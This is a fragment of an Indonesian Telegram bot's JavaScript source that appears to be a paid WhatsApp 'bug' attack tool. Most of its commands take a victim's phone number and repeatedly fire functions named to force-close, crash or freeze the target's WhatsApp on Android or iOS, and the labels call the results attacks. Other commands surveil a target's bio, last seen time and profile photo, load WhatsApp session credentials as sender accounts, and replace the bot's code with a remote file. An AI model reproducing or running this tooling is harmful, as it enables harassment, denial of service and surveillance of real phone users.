          media: fileId,
          caption,
          parse_mode: "HTML"
        },
        {
          reply_markup: {
            inline_keyboard: [
              [
                { text: "(🔄) 𝚁𝚎𝚏𝚛𝚎𝚜𝚑", callback_data: `refresh_${userId}`, style: "success", icon_custom_emoji_id: "5352759161945867747" }
              ],
              [ 
                { text: "(⚡) 𝙆𝙞𝙣𝙜", url: 't.me/zhatanixx', style: "danger", icon_custom_emoji_id: "5085022089103016925" }
              ]
            ]
          }
        }
      );
    }

    return ctx.editMessageText(caption, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "(🔄) 𝚁𝚎𝚏𝚛𝚎𝚜𝚑", callback_data: `refresh_${userId}`, style: "success", icon_custom_emoji_id: "5352759161945867747" }
          ],
          [ 
            { text: "𝙆𝙞𝙣𝙜", url: 't.me/zhatanixx', style: "primary", icon_custom_emoji_id: "5085022089103016925" }
          ]
        ]
      }
    });

  } catch (err) {
    return ctx.answerCbQuery("❌ Gagal refresh!");
  }
});

bot.command('cekidch', async (ctx) => {
  const args = ctx.message.text.split(" ");
  
  // Cek input
  if (args.length < 2) return ctx.reply("❌ Format salah! /cekidch <link_channel>");
  
  const link = args[1];

  // Validasi link channel WA
  if (!link.includes("https://whatsapp.com/channel/")) {
    return ctx.reply("❌ Link channel tidak valid!");
  }

  try {
    // Ambil kode undangan dari link
    const inviteCode = link.split("https://whatsapp.com/channel/")[1];

    // Ambil metadata channel WA via Baileys
    const res = await zenxy.newsletterMetadata("invite", inviteCode);

    // Format teks hasil
    const teks = `
📡 *Data Channel WhatsApp*
━━━━━━━━━━━━━━━━━━
🆔 *ID:* ${res.id}
📛 *Nama:* ${res.name}
👥 *Total Pengikut:* ${res.subscribers}
📊 *Status:* ${res.state}
✅ *Verified:* ${res.verification === "VERIFIED" ? "Terverifikasi" : "Belum Verif"}
`;

    // Kirim balasan ke Telegram
    await ctx.reply(teks, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal mengambil data channel. Pastikan link benar dan WA bot online.");
  }
});

bot.command("cekbio", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("👀 ☇ Format: /cekbio 62×××");
    }

    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
            ]
        }
    });

    try {
        // Menggunakan Baileys untuk mendapatkan info kontak
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                        ]
                    }
                }
            );
            return;
        }

        // Mendapatkan detail kontak
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡</b></blockquote>
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <b>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</b>`;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                      
                    ]
                }
            });
        }

        // Hapus pesan proses
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                    ]
                }
            }
        );
    }
});

bot.command("update", async (ctx) => {
  const repoRaw = "https://raw.githubusercontent.com/NAMA-AKUN/NAMA-REPO/main/index.js";
  const filePath = "./index.js";

  await ctx.reply(
`<blockquote>⏳ Sedang mengecek update...</blockquote>`,
{ parse_mode: "HTML" }
  );

  try {
    const { data } = await axios.get(repoRaw + "?v=" + Date.now());

    if (!data) {
      return ctx.reply(
`<blockquote>❌ Update gagal!\nFile kosong</blockquote>`,
{ parse_mode: "HTML" }
      );
    }

    const oldData = fs.existsSync(filePath)
      ? fs.readFileSync(filePath, "utf-8")
      : "";

    const oldHash = getHash(oldData);
    const newHash = getHash(data);

    if (oldHash === newHash) {
      return ctx.reply(
`<blockquote>⚠️ Tidak ada update terbaru</blockquote>`,
{ parse_mode: "HTML" }
      );
    }

    fs.writeFileSync(filePath, data);

    await ctx.reply(
`<blockquote>✅ Update berhasil!\n🔄 Bot akan restart..\n⌛tunggu 5 detik dan /start lagi.</blockquote>`,
{ parse_mode: "HTML" }
    );

    setTimeout(() => {
      process.exit(0);
    }, 2000);

  } catch (e) {
    ctx.reply(
`<blockquote>❌ Update gagal!\n${e.message}</blockquote>`,
{ parse_mode: "HTML" }
    );
  }
});

bot.command("addsender", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    const tagFile = args[1];

    if (!tagFile) {
      return ctx.reply("⚠️ Format salah.\nGunakan: /addsender <tag_file> (reply ke file creds.json)");
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
      return ctx.reply("⚠️ Harap reply ke file creds.json dengan command ini.");
    }

    const fileId = ctx.message.reply_to_message.document.file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const deviceDir = path.join(SESSIONS_DIR, tagFile);
    if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });

    const credsPath = path.join(deviceDir, "creds.json");

    const res = await fetch(fileLink.href);
    const buffer = Buffer.from(await res.arrayBuffer());
    fs.writeFileSync(credsPath, buffer);

    await ctx.reply(`✅ Creds berhasil disimpan di:\n${credsPath}`);

    
    await connectWhatsApp(tagFile, credsPath, ctx);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan saat menambahkan addsender.");
  }
});

bot.command("liatsender", async (ctx) => {
  const devices = fs.readdirSync(SESSIONS_DIR).filter((dir) => {
    return fs.existsSync(path.join(SESSIONS_DIR, dir, "creds.json"));
  });

  if (devices.length === 0) {
    return ctx.reply("📂 Tidak ada sender tersimpan.");
  }

  let replyMsg = "📑 Daftar Sender:\n";

  for (const tagFile of devices) {
    const credsPath = path.join(SESSIONS_DIR, tagFile, "creds.json");

    try {
      const { state, saveState } = useSingleFileAuthState(credsPath);
      const sock = makeWASocket({ auth: state, printQRInTerminal: false });

      sock.ev.on("creds.update", saveState);

      await new Promise((resolve) => {
        sock.ev.on("connection.update", (update) => {
          const { connection } = update;

          if (connection === "open") {
            const me = sock.user || {};
            replyMsg += `\n✅ ${tagFile}\n- ID: ${me.id}\n- Nama: ${me.name}`;
            sock.end();
            resolve();
          } else if (connection === "close") {
            replyMsg += `\n❌ ${tagFile} (expired / invalid)`;
            resolve();
          }
        });
      });
    } catch (err) {
      console.error(err);
      replyMsg += `\n⚠️ ${tagFile} (gagal dibaca)`;
    }
  }
  
  ctx.reply(replyMsg);
});


///============[ CMD BUG'S SPAM ]============\\\
bot.command("XDelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /XDelay 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
<blockquote>⸙ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗕𝗨𝗚</blockquote>
 ⌑ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${q}
 ⌑ 𝗘𝗙𝗙𝗘𝗖𝗞 : 𝗗𝗲𝗹𝗮𝘆 𝗜𝗻𝘃𝗶𝘀𝗶𝗯𝗹𝗲
<blockquote>⸙ 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 𝗦𝗜𝗟𝗔𝗛 𝗞𝗔𝗡 𝗕𝗨𝗚 𝗟𝗔𝗚𝗜</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗘𝗞 ⸙ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      await WidixDelayInvis(sock, target);
      await sleep(100);
      await WidixDlayInvisss(sock, target);
      await sleep(250);
    }
  })();
});

bot.command("Xzhatanixx", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /Xzhatanixx 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
<blockquote>⸙ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗕𝗨𝗚</blockquote>
 ⌑ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${q}
 ⌑ 𝗘𝗙𝗙𝗘𝗖𝗞 : 𝘿𝙀𝙇𝘼𝙔 𝙃𝘼𝙍𝘿 𝙄𝙉𝙑𝙄𝙎 𝙎𝙋𝘼𝙈
<blockquote>⸙ 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 𝗦𝗜𝗟𝗔𝗛 𝗞𝗔𝗡 𝗕𝗨𝗚 𝗟𝗔𝗚𝗜</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗘𝗞 ⸙ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 10; i++) {
      await WidixDelayInvis(sock, target);
      await sleep(10);
      await WidixDlayInvisss(sock, target);
      await sleep(90)
    }
  })();
});

bot.command("XFcIosSpam", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /XFcIosSpam 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
<blockquote>⸙ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗕𝗨𝗚</blockquote>
 ⌑ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${q}
 ⌑ 𝗘𝗙𝗙𝗘𝗖𝗞 : 𝙁𝙊𝙍𝘾𝙀𝙇𝙊𝙎𝙀 𝙄𝙊𝙎 𝙎𝙋𝘼𝙈
<blockquote>⸙ 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 𝗦𝗜𝗟𝗔𝗛 𝗞𝗔𝗡 𝗕𝗨𝗚 𝗟𝗔𝗚𝗜</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗘𝗞 ⸙ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      await IphoneFcByWidix(target)
      await sleep(10);
      await WidixForceloseSpam(sock, target);
      await sleep(100)
    }
  })();
});

bot.command("Xilent", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /Xilent 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
<blockquote>⸙ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗕𝗨𝗚</blockquote>
 ⌑ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${q}
 ⌑ 𝗘𝗙𝗙𝗘𝗖𝗞 : 𝙁𝙊𝙍𝘾𝙀𝙇𝙊𝙎𝙀 𝘼𝙉𝘿𝙍𝙊𝙄𝘿 𝙎𝙋𝘼𝙈
<blockquote>⸙ 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 𝗦𝗜𝗟𝗔𝗛 𝗞𝗔𝗡 𝗕𝗨𝗚 𝗟𝗔𝗚𝗜</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗘𝗞 ⸙ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 20; i++) {
      await WidixForceloseSpam(sock, target);
      await sleep(100);
      await WidixForceloseClik(target);
      await sleep(1000)
    }
  })();
});


// -------------> END CASE SPAM <------------- \\
bot.command("XCanBuldo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /XCanBuldo 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
<blockquote>⸙ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗕𝗨𝗚</blockquote>
 ⌑ 𝗧𝗔𝗥𝗚𝗘𝗧 : ${q}
 ⌑ 𝗘𝗙𝗙𝗘𝗖𝗞 : 𝘽𝙐𝙇𝘿𝙊 𝙄𝙉𝙑𝙄𝙎 𝙎𝙋𝘼𝙈
<blockquote>⸙ 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 𝗦𝗜𝗟𝗔𝗛 𝗞𝗔𝗡 𝗕𝗨𝗚 𝗟𝗔𝗚𝗜</blockquote>
`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗖𝗘𝗞 ⸙ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

  (async () => {
    for (let i = 0; i < 20; i++) {
      await WidixBuldoZerr(sock, target);
      await sleep(100);
      await WidixDlayInvisss(sock, target);
      await sleep(1000);
    }
  })();
});
///============[ CMD BUG'S ]============\\\
bot.command("XdelayHardV1", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XdelayHardV1 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, Widix, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑩𝒖𝒈 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Delay HardV1 Invis
⌑ Status: Process
⌑ Developer : zhatanixx.t.me
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 120; i++) {
    await WidixDelayInvis(sock, target);
    await sleep(800);
    await WidixDlayInvisss(sock, target);
    await sleep(1000);
    await WidixBuldoZerr(sock, target);
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑨𝒕𝒕𝒂𝒄𝒌</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Delay HardV1 Invis 
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("XdelayHardV2", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XdelayHardV2 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, Widix, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑩𝒖𝒈 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Delay HardV2 Invis
⌑ Status: Process
⌑ Developer : zhatanixx.t.me
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 150; i++) {
    await WidixDelayInvis(sock, target);
    await sleep(800);
    await WidixDlayInvisss(sock, target);
    await sleep(1000);
    await WidixBuldoZerr(sock, target);
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑨𝒕𝒕𝒂𝒄𝒌</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Delay HardV2 Invis 
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("XdelayVisible", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XdelayVisible 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, Widix, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑩𝒖𝒈 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Delay Visible 
⌑ Status: Process
⌑ Developer : zhatanixx.t.me
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 130; i++) {
    await WidixDlayInvisss(sock, target);
    await sleep(1000);
    await WidixBuldoZerr(sock, target);
    await sleep(2000);
    await DelayXfcWidix(sock, target);
    await sleep(3000);
    await WidixVisible(target);
    await sleep(4000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑨𝒕𝒕𝒂𝒄𝒌</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Delay Visible 
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Xbuldozer", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Xbuldozer 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, Widix, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑩𝒖𝒈 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Buldozer 
⌑ Status: Process
⌑ Developer : zhatanixx.t.me
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 500; i++) {
    await WidixBuldoZerr(sock, target);
    await sleep(1000);
    await WidixDlayInvisss(sock, target)
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑨𝒕𝒕𝒂𝒄𝒌</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Buldozer
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("XdelayBuldo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XdelayBuldo 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, Widix, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑩𝒖𝒈 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Delay X Buldo
⌑ Status: Process
⌑ Developer : zhatanixx.t.me
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 200; i++) {
    await WidixBuldoZerr(sock, target);
    await sleep(800);
    await WidixDelayInvis(sock, target)
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑨𝒕𝒕𝒂𝒄𝒌</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Delay X Buldo
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("XFcandroid", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XFcandroid 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, Widix, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑩𝒖𝒈 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Forcelose Android 
⌑ Status: Process
⌑ Developer : zhatanixx.t.me
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await WidixForceloseSpam(sock, target);
    await sleep(800);
    await WidixForceloseClik(target);
    await sleep(900);
    await WidixDelayInvis(sock, target);
    await sleep(1000);
    await ForcloseClick(sock, target);
    await sleep(3000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑨𝒕𝒕𝒂𝒄𝒌</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Forcelose Android 
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("XFcVisible", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XFcVisible 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, Widix, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑩𝒖𝒈 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Forcelose Visible 
⌑ Status: Process
⌑ Developer : zhatanixx.t.me
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await WidixForceloseSpam(sock, target);
    await sleep(600);
    await WidixForceloseClik(target);
    await sleep(700);
    await WidixCrashAndro(sock, target);
    await sleep(800);
    await WidixDelayHardddd(sock, target);
    await sleep(100);
    await ForcloseClick(sock, target);
    await sleep(3000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑨𝒕𝒕𝒂𝒄𝒌</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Forcelose Visible 
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("XCrashUi", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /XCrashUi 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, Widix, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝑺𝒊𝒍𝒆𝒏𝒕 𝑲𝒊𝒍𝒍𝒆𝒓 𝑩𝒖𝒈 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Crash Ui
⌑ Status: Process
⌑ Developer : zhatanixx.t.me
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await WidixDelayInvis(sock, target);
    await sleep(500);
